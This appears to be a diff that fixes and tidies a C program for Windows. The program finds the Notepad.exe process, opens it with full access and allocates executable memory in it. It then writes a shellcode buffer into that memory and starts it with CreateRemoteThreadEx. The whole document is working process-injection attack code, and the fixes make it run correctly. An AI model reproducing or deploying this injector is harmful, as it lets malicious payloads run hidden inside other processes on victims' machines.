@@ -1,11 +1,13 @@
-#include <stdbool.h>
-#include <stdio.h>
-#include <tlhelp32.h>
 #include <windows.h>
 
-#define okay(msg, ...) printf("[+]" msg "\n", ##__VA_ARGS__);
-#define info(msg, ...) printf("[*]" msg "\n", ##__VA_ARGS__);
-#define warn(msg, ...) printf("[-]" msg "\n", ##__VA_ARGS__);
+#include <tlhelp32.h>
+
+#include <stdbool.h>
+#include <stdio.h>
+
+#define okay(msg, ...) printf("[+]" msg "\n", ##__VA_ARGS__)
+#define info(msg, ...) printf("[*]" msg "\n", ##__VA_ARGS__)
+#define warn(msg, ...) printf("[-]" msg "\n", ##__VA_ARGS__)
 
 int main(int argc, char *argv[]) {
   /*shellcode*/
@@ -37,51 +39,48 @@ int main(int argc, char *argv[]) {
   // variables
   HANDLE hProcess = NULL, hSnapshot = NULL, hThread = NULL;
   LPVOID lpAlloc_mem = NULL;
-  PROCESSENTRY32 pe32;
-  pe32.dwSize = sizeof(PROCESSENTRY32);
-  boolean bFound = false;
+  PROCESSENTRY32W pe32;
+  pe32.dwSize = sizeof(PROCESSENTRY32W);
+  bool bFound = false;
 
   // first we take a snapshot of the processes
-  info("Taking Snapshot of the current processes...\n");
+  info("Taking Snapshot of the current processes...");
   hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-  if (hSnapshot == NULL) {
-    warn("error while taking the snapshot, error: %lu\n", GetLastError());
-
+  if (hSnapshot == INVALID_HANDLE_VALUE) {
+    warn("error while taking the snapshot, error: %lu", GetLastError());
     return EXIT_FAILURE;
   }
-  okay("Snapshot was taken...\n");
+  okay("Snapshot was taken...");
 
-  /*
-    TH32CS_SNAPPROCESS: means you want to take a snapshot of the process list
-    0: means you want to take a snapshot of all processes
-  */
-  if (!Process32First(hSnapshot, &pe32)) {
-    warn("Eror while using the process32First function, error: %lu\n",
+  if (!Process32FirstW(hSnapshot, &pe32)) {
+    warn("Error while using the Process32FirstW function, error: %lu",
          GetLastError());
     return EXIT_FAILURE;
   }
-  info("going throu the processes list...");
+  info("going through the processes list...");
 
   do {
-    if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
-      info("%ls was found!\n", pe32.szExeFile);
+    if (wcscmp(pe32.szExeFile, L"Notepad.exe") == 0) {
+      info("%ls was found!", pe32.szExeFile);
       bFound = true;
-      // now we will get a handel of the process
-      info("Trying to Get a handel of the process...\n");
+      CloseHandle(hSnapshot);
+      // now we will get a handle of the process
+      info("Trying to Get a handle of the process...");
       hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
 
       if (hProcess == NULL) {
-        Warn("Couldn't get a handle to the process '%ls' PID <%ld>, error: %ld",
-             pe32.szExeFile, pe32.th32ProcessID, GetLastError);
+        warn("Couldn't get a handle to the process '%ls' PID <%lu>, error: %lu",
+             pe32.szExeFile, pe32.th32ProcessID, GetLastError());
         return EXIT_FAILURE;
       }
-      okay("Got a handle to the process '%ls' PID <%ld>\n\\---0x%p",
+      okay("Got a handle to the process '%ls' PID <%lu>\n\\---0x%p",
            pe32.szExeFile, pe32.th32ProcessID, hProcess);
 
       // Now we allocate bytes to the process memory.
-      info("allocating bytes to the process memory...\n");
-      lpAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
-                                   (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+      info("allocating bytes to the process memory...");
+      lpAlloc_mem =
+          VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
+                         (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
       if (!lpAlloc_mem) {
         warn("VirtualAllocEx failed in target process '%ls' , error: %lu",
              pe32.szExeFile, GetLastError());
@@ -91,7 +90,7 @@ int main(int argc, char *argv[]) {
            sizeof(shellcode));
 
       // Now write the shellcode into the memory.
-      info("Writing the shellcode into memory...\n");
+      info("Writing the shellcode into memory...");
       if (WriteProcessMemory(hProcess, lpAlloc_mem, shellcode,
                              sizeof(shellcode), NULL)) {
         okay("Wrote %zu bytes to memory\n", sizeof(shellcode));
@@ -100,36 +99,38 @@ int main(int argc, char *argv[]) {
              GetLastError());
         return EXIT_FAILURE;
       }
-      info("Creating a thread..\n");
+      info("Creating a thread...");
       // Now create a thread to run our payload
       hThread = CreateRemoteThreadEx(hProcess, NULL, 0,
                                      (LPTHREAD_START_ROUTINE)lpAlloc_mem, NULL,
                                      0, NULL, NULL);
       if (hThread == NULL) {
-        Warn("Failed to get handle to the thread, error: %ld", GetLastError());
+        warn("Failed to get handle to the thread, error: %lu", GetLastError());
         CloseHandle(hProcess);
         return EXIT_FAILURE;
       }
-      okay("Got a handle to the thread <%ld>\n\\---0x%p", pe32.th32ProcessID,
+      okay("Got a handle to the thread <%lu>\n\\---0x%p", pe32.th32ProcessID,
            hThread);
 
       info("Waiting for the thread to finish executing....");
       WaitForSingleObject(hThread, INFINITE);
-      okay("Thread finsihed execution!\n");
+      okay("Thread finished execution!");
 
       // cleanup
-      info("Cleanup...\n");
+      info("Cleanup...");
       VirtualFreeEx(hProcess, lpAlloc_mem, 0, MEM_RELEASE);
       CloseHandle(hThread);
       CloseHandle(hProcess);
+
       break;
     }
-  } while (Process32Next(hSnapshot, &pe32));
+  } while (Process32NextW(hSnapshot, &pe32));
 
   if (bFound == true) {
     okay("Fin!");
   } else {
     info("Not Found");
+    CloseHandle(hSnapshot);
   }
 
   return EXIT_SUCCESS;
